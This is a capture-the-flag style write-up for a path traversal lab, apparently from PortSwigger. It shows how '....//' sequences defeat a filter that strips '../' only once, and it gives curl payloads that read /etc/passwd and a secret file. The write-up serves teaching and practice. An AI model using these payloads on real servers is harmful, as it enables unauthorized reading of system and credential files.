# File path traversal, traversal sequences stripped non-recursively — Practitioner

**Status:** Solved

---

## Goal  
Bypass the filter that removes `../` only once. Use a tricked input to reach a sensitive file (like `/etc/passwd` or config) and get the flag.

---

## Steps (simple & complete)

1. **Find the vulnerable endpoint**  
   - Look for something like:
     ```
     GET /image?filename=dog.jpg
     ```
     The app reads the file based on this parameter.

2. **Test normal traversal**  
   - Try:
     ```bash
     /image?filename=../../../../etc/passwd
     ```
     It fails because the app strips `../` once.

3. **Understand the filter**  
   - If the app removes `../` only one time, input like `....//` becomes `../` after the first strip — this is the key trick.

4. **Use the bypass sequence**  
   - Replace each `../` with `....//` so that after stripping, it still resolves to `../`.
   - Example:
     ```bash
     curl -s "https://TARGET/image?filename=....//....//....//....//etc/passwd"
     ```

5. **Check the response**  
   - If you see system usernames or readable content, you’ve successfully bypassed the filter.

6. **Find the flag file**  
   - In PortSwigger labs, the flag is usually inside `/home/carlos/secret` or similar.
   - Try:
     ```bash
     curl -s "https://TARGET/image?filename=....//....//....//....//home/carlos/secret"
     ```

7. **Save your result**  
   - Record the vulnerable parameter, the exact payload, and the successful response (redacted).

---

## Example
- Vulnerable endpoint:  
  `GET /image?filename=dog.jpg`
- Working payload:
  ```bash
  curl -s "https://TARGET/image?filename=....//....//....//....//home/carlos/secret"
